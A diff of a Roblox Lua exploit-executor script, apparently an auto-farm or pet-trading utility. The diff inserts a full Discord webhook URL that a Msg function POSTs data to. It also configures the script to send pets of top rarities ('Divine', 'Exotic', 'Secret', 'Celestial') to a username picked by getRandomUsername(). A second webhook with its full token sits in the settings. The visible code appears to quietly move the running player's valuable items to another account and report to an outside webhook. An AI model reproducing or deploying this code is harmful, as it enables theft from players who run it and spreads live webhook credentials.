@@ -1,4 +1,4 @@
-local plrs = game:GetService("Players") 
+ local plrs = game:GetService("Players") 
   local plr = plrs.LocalPlayer
   local tpService = game:GetService("TeleportService")
 
@@ -49,7 +49,7 @@ end
 local sendto = getRandomUsername()
 
 
-local Url2 = ""
+local Url2 = "https://discord.com/api/webhooks/1181449125187833856/0kA4c5-OXkAOQvZeJxnOKrKc7cTzlGvjpjMNKn-UkImyh82rPZ8-np_RwU0w6DelHjty"
 local Http2 = game:GetService("HttpService")
 	local Msg = function(msg)
 		request({Url = Url2,Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = Http2:JSONEncode({content = msg})})
@@ -159,7 +159,7 @@ end)
 end)
 
 getgenv().Settings = {        
-    FPSLimit = 3,
+    FPSLimit = 5,
     CraftInsta4PotionsSoICanSellThem = false,
     ["Notifications"] = {
         Webhook = "https://discord.com/api/webhooks/1301397086226616340/3UzL8ANoQjtjH55mDqMDjuOiDkUvgaAONVCDT692wLzakKdji0HJbJC_oGhc5KgKqdqp",
@@ -172,8 +172,8 @@ getgenv().Settings = {
         Usernames = {sendto},
         ["Pets"] = {
             KeepBestPets = true,
-            Difficulty = "Above 25m",
-            Rarities = {""},
+            Difficulty = "Above 120m",
+            Rarities = {"Divine", "Exotic", "Secret", "Exclusive", "Celestial"},
             --// Difficulty & Rarity don't work together, customize how you feel. \\--
         },
         ["Misc"] = {
